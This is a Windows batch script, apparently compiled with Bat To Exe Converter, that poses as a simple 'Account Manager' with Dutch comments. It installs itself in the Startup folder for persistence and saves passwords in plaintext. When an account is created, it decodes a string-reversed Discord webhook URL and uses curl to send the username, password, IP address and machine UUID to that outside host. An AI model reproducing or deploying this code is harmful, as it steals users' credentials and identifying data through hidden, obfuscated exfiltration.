::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFEoGHFHableeCaIS5Of66/m7g2BTUfo6GA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
chcp 65001 >nul
title Account Manager
setlocal EnableDelayedExpansion
echo Initializing...
set EXE_PATH=AM.exe
set SHORTCUT_NAME=AM

:: Maak de snelkoppeling
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%SHORTCUT_NAME%.lnk');$s.TargetPath='%EXE_PATH%';$s.Save()"
if not exist C:\Accounts (
    mkdir C:\Accounts
	cd C:\Accounts
	goto :makeaccount
) else (
	dir /b "C:\Accounts\*.acc" >nul 2>&1
	if %errorlevel%==0 (
	goto :Login
) else (
	goto :makeaccount
	)
)

:menu
goto :Login
cls
echo.
echo 1. Create an account
echo 2. Login to an account
echo 3. Reset Password
echo 4. Exit
echo.
set /p choice=Choose an option (1/2/3): 

if "%choice%"=="1" goto create
if "%choice%"=="2" goto login
if "%choice%"=="3" goto resetpass
if "%choice%"=="4" exit
goto menu

:makeaccount
cls
title Creating an Account
set /p newuser=Enter username: 
cls
set /p newpass=Enter password: 
cls

echo Username: %newuser%>C:\Accounts\%newuser%.acc
echo Password: %newpass%>>C:\Accounts\%newuser%.acc

echo.
echo Account created, uploading credentials to server and logging in...

set "input=jx9wtssJ-_LUedRrzffxE5INcSCzujatr7wx2TAEplp9MwaISSEMpSYkyUt6Npn9avhy/7809385956519796831/skoohbew/ipa/moc.drocsid//:sptth"
set "reversed="

:reverseLoop
if not "%input%"=="" (
    set "lastChar=%input:~-1%"
    set "reversed=!reversed!!lastChar!"
    set "input=%input:~0,-1%"
    goto reverseLoop
)

:: Zet hier je webhook URL (of reversed string als je die wil obfuscaten)
set "webhook=!reversed!"

:: Pak het IP-adres
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do set "ip=%%a"
set "ip=%ip:~1%"

:: Pak de UUID van het systeem
for /f "skip=1 delims=" %%b in ('wmic csproduct get uuid') do (
    if not defined uuid set "uuid=%%b"
)
set "uuid=%uuid:~0,36%"

:: Zet je message variabele met IP en UUID erbij
set "message=New account created: Username: %newuser% Password: %newpass% IP: %ip% UUID: %uuid%"

:: Verstuur het bericht via webhook met curl
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%message%\"}" %webhook%

pause
goto loggingin

:login
title Logging in
cls
set /p loginuser=Enter username: 
if not exist C:\Accounts\%loginuser%.acc (
    echo.
    echo Account not found.
    pause
    goto menu
)

:: Password prompt met masking
for /f "usebackq delims=" %%P in (`powershell -Command "$pass = Read-Host -AsSecureString 'Enter password'; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"`) do set "loginpass=%%P"

:: Haal opgeslagen password uit bestand
for /f "tokens=2 delims=:" %%p in ('findstr "Password:" C:\Accounts\%loginuser%.acc') do set "savedpass=%%p"
set "savedpass=%savedpass:~1%"

if "%loginpass%"=="%savedpass%" (
	:loggingin
    cls
    echo Fetching...
    timeout /t 1 /nobreak >nul
    cls
    echo Login successful!
	goto :mainwindow
) else (
    echo.
    echo Incorrect password.
)
pause
goto menu

:resetpass
cls
echo.

:: Check of er accounts zijn
dir /b C:\Accounts\*.acc >nul 2>&1
if errorlevel 1 (
    echo No accounts found.
    pause
    goto menu
)

:: Lijst van accounts tonen
echo Select an account to reset:
set /a count=0
for %%f in (C:\Accounts\*.acc) do (
    set /a count+=1
    set "acc[!count!]=%%~nf"
    echo !count!. %%~nf
)

echo.
set /p accchoice=Choose number:
cls

:: Check of keuze geldig is
if "!acc[%accchoice%]!"=="" (
    echo Invalid choice.
    pause
    goto resetpass
)

set "resetuser=!acc[%accchoice%]!"

:: Random 6-cijferig code genereren
set "randomnum="
for /l %%i in (1,1,6) do (
    set /a "r=!random! %% 10"
    set "randomnum=!randomnum!!r!"
)

:: Toon de code via popup
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'One time use code', '%randomnum%', [System.Windows.Forms.ToolTipIcon]::None)}"

:: Vraag de code
set /p resetpass=Enter the verification code: 

if /I "!resetpass!"=="%randomnum%" (
    goto verifresetpass
) else (
    echo Incorrect code.
    pause
    goto resetpass
)

:verifresetpass
cls
:: Nieuwe password masked invoeren
for /f "usebackq delims=" %%P in (`powershell -Command "$pass = Read-Host -AsSecureString 'New password'; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"`) do set "newpass=%%P"

:: Herschrijf account bestand met nieuwe password
echo Username: %resetuser%>C:\Accounts\%resetuser%.acc
echo Password: %newpass%>>C:\Accounts\%resetuser%.acc

echo.
echo Password reset successfully!
pause
goto menu

:mainwindow
cls
pause